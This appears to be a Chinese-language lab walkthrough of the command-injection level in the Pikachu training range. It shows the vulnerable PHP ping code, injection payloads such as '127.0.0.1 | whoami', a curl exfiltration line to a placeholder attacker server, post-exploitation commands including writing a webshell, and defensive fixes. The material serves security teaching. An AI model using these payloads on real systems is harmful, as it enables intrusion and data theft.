# RCE exec "ping" 通关笔记

> 页面让你输入 IP 去 ping——**它把 IP 直接拼进了系统命令。**
>
> 那就别怪我们往里塞点别的东西了。

---

## 一、环境与目标

| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 关卡位置 | RCE → exec "ping" |
| 页面地址 | `http://pikachu/vul/rce/rce_ping.php` |
| 提交方式 | POST |
| 参数名 | `ipaddress` |
| 目标 | 在服务器上执行任意命令 |

页面有一个输入框：「Here, please enter the target IP address!」，一个 ping 按钮。

---

## 二、我的解题步骤

### 步骤 1：先正常 ping 一次

输入 `127.0.0.1`，点 ping。

页面下方出现：

```
Ping 127.0.0.1  具有 32 字节的数据:
来自 127.0.0.1 的回复: 字节=32 时间<1ms TTL=128
...
```

**说明服务器真的执行了 `ping` 命令。**

### 步骤 2：看源码，发现是命令拼接

```php
if(isset($_POST['submit']) && $_POST['ipaddress']!=null){
    $ip=$_POST['ipaddress'];
    if(stristr(php_uname('s'), 'windows')){
        $result.=shell_exec('ping '.$ip);//直接将变量拼接进来，没做处理
    }else {
        $result.=shell_exec('ping -c 4 '.$ip);
    }
}
```

**`shell_exec('ping '.$ip)` —— 把 `$ip` 直接拼进 shell 命令。**

### 步骤 3：试试命令分隔符

在 Windows 下，`|` `&` `&&` `||` 都可以连接多条命令。

我先试了 `&`：

```
127.0.0.1 & whoami
```

页面只显示了 ping 的结果，`whoami` 的输出没出现（可能是输出缓冲顺序问题）。

换成 `|`：

```
127.0.0.1 | whoami
```

**页面输出：**

```
yzz\wl
```

**这是服务器的当前用户名。**

### 步骤 4：确认 RCE 成立

已经能执行任意命令了，接下来可以做任何事：

```
127.0.0.1 | whoami          # 当前用户
127.0.0.1 | ipconfig        # 网络配置
127.0.0.1 | dir             # 列目录
127.0.0.1 | type C:\Windows\win.ini
127.0.0.1 | net user        # 系统用户列表
```

我实测的对比：

| 输入 | 输出 |
| --- | --- |
| `127.0.0.1` | ping 的正常输出 |
| `127.0.0.1 \| whoami` | 额外多出 `yzz\wl` |

---

## 三、原理分析

### 3.1 源码

```php
$result='';
if(isset($_POST['submit']) && $_POST['ipaddress']!=null){
    $ip=$_POST['ipaddress'];
//     $check=explode('.', $ip);可以先拆分，然后校验数字以范围，第一位和第四位1-255，中间两位0-255
    if(stristr(php_uname('s'), 'windows')){
        $result.=shell_exec('ping '.$ip);//直接将变量拼接进来，没做处理
    }else {
        $result.=shell_exec('ping -c 4 '.$ip);
    }
}
```

作者在注释里写了**正确的做法**：

```php
// $check=explode('.', $ip);可以先拆分，然后校验数字以范围，第一位和第四位1-255，中间两位0-255
```

但这行代码**被注释掉了**。

### 3.2 命令分隔符有哪些

| 符号 | 系统 | 含义 |
| --- | --- | --- |
| `;` | Linux | 顺序执行 |
| `\|` | 两者 | 管道（把前一个的输出给后一个） |
| `\|\|` | 两者 | 前一个失败才执行后一个 |
| `&&` | 两者 | 前一个成功才执行后一个 |
| `&` | Windows | 顺序执行（后台） |
| `` ` `` | Linux | 命令替换 |
| `$()` | Linux | 命令替换 |

**在 Windows 下最常用的是 `|` 和 `&&`。**

### 3.3 为什么 `|` 能成功

```cmd
ping 127.0.0.1 | whoami
```

`|` 是管道：把 `ping` 的输出交给 `whoami` 当输入。

`whoami` 不读输入，直接输出自己的结果——**所以你能看到 `yzz\wl`。**

### 3.4 为什么 `&` 那次没看到输出

```cmd
ping 127.0.0.1 & whoami
```

`&` 是"顺序执行"，`whoami` 应该也会输出。

实际没看到，可能是：

- `shell_exec` 的缓冲问题
- 输出被截断
- `&` 在 URL 中被编码成了 `%26`，传过去还是 `&`——应该没问题

**但 `|` 是确定有效的，用 `|` 更稳。**

---

## 四、知识点与笔记

### 4.1 命令执行漏洞的判断

| 步骤 | 操作 |
| --- | --- |
| 1 | 找一个"会调用系统命令"的功能（ping、nslookup、压缩） |
| 2 | 输入里加 `\| whoami` |
| 3 | 看页面上有没有多出用户名 |

**有回显的话，判断非常直接。**

### 4.2 无回显怎么办

如果命令输出不显示，用**时间盲注**的思路：

```
127.0.0.1 | ping -n 5 127.0.0.1
```

响应变慢 → 命令被执行了。

或者用"外带"：

```
127.0.0.1 | curl http://你的服务器/`whoami`
```

### 4.3 常见的命令执行函数

| 函数 | 特点 |
| --- | --- |
| `system()` | 直接输出 |
| `exec()` | 返回最后一行，需手动输出 |
| `shell_exec()` | 返回全部输出（字符串） |
| `passthru()` | 直接输出二进制 |
| `popen()` | 打开进程 |
| 反引号 `` ` `` | 等价 `shell_exec` |

### 4.4 拿到 RCE 之后做什么

| 目标 | 命令（Windows） |
| --- | --- |
| 看身份 | `whoami` / `whoami /priv` |
| 看系统 | `systeminfo` |
| 看用户 | `net user` |
| 看网络 | `ipconfig /all` |
| 找文件 | `dir /s /b *.config` |
| 写 webshell | `echo ^<?php ... ?^> > shell.php` |

---

## 五、和 XSS / SQL 注入的区别

| | XSS | SQL 注入 | RCE |
| --- | --- | --- | --- |
| 执行环境 | 用户浏览器 | 数据库 | **服务器操作系统** |
| 能拿什么 | Cookie | 数据 | **整个服务器** |
| 严重程度 | 中 | 高 | **最高** |

**RCE 是"终点站"——拿到它，其他漏洞都不需要了。**

---

## 六、防御怎么写

### 6.1 白名单校验（最重要）

```php
if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
    exit('IP 格式不正确');
}
```

`127.0.0.1 | whoami` 会被 `filter_var` 直接判为非法。

### 6.2 转义参数

```php
$result = shell_exec('ping -c 4 ' . escapeshellarg($ip));
```

`escapeshellarg()` 会把参数整体用引号包起来，`|` 失去特殊含义。

### 6.3 干脆不用 shell

```php
// 用库函数代替
$result = shell_exec('ping -c 4 ' . long2ip(ip2long($ip)));
```

或者用 PHP 的 socket 自己实现 ping，**完全不碰 shell**。

### 6.4 禁用危险函数

```ini
; php.ini
disable_functions = system,exec,shell_exec,passthru,popen,proc_open
```

**这是兜底，不是根治。**

### 6.5 最小权限

Web 服务不要用 Administrator / root 运行。

**即使被 RCE，影响也有限。**

---

## 七、总结

| 要点 | 内容 |
| --- | --- |
| 这关教什么 | 命令拼接导致 RCE |
| 判断 | 输入 `127.0.0.1 \| whoami` |
| 实测 | 输出 `yzz\wl` |
| 关键代码 | `shell_exec('ping '.$ip)` |
| 修复 | `filter_var` + `escapeshellarg` + 禁用函数 |

**一句话**：

> **把用户输入拼进 shell 命令，等于把服务器的键盘交给用户。**

---

## 参考

- [OWASP: Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PHP: shell_exec](https://www.php.net/manual/zh/function.shell-exec.php)
- [PHP: escapeshellarg](https://www.php.net/manual/zh/function.escapeshellarg.php)
- [Pikachu 源码](https://github.com/zhuifengshaonianhanlu/pikachu)
